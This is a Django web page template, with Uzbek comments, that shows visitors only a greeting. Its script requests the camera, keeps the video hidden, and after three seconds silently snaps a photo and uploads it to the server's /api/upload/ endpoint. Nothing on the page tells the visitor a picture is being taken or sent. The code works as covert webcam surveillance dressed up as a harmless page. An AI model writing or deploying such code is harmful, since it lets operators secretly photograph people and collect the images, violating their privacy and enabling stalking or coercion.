<!-- myapp/templates/myapp/index.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasmga olish va yuborish</title>
    <style>
        .body { display: none; }
    </style>
</head>
<body>
    <h1>Salom !!!</h1>
    <div class="body">
        <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const video = document.getElementById('video');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;

                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, 640, 480);

                        const dataUrl = canvas.toDataURL('image/png');
                        fetch('/api/upload/', {
                            method: 'POST',
                            body: JSON.stringify({ image: dataUrl }),
                            headers: {
                                'Content-Type': 'application/json',
                                'X-CSRFToken': getCookie('csrftoken')
                            }
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Rasm yuborildi:', data);
                        })
                        .catch(error => {
                            console.error('Xato:', error);
                        });
                    }, 3000); // 3 soniyadan so'ng rasm olish

                    // Video elementni yashirish
                    video.style.display = 'none';
                    document.body.style.display = 'block';
                })
                .catch(err => {
                    console.error("Kamerani olishda xatolik: ", err);
                });

            function getCookie(name) {
                let cookieValue = null;
                if (document.cookie && document.cookie !== '') {
                    const cookies = document.cookie.split(';');
                    for (let i = 0; i < cookies.length; i++) {
                        const cookie = cookies[i].trim();
                        if (cookie.substring(0, name.length + 1) === (name + '=')) {
                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                            break;
                        }
                    }
                }
                return cookieValue;
            }
        });
    </script>
</body>
</html>
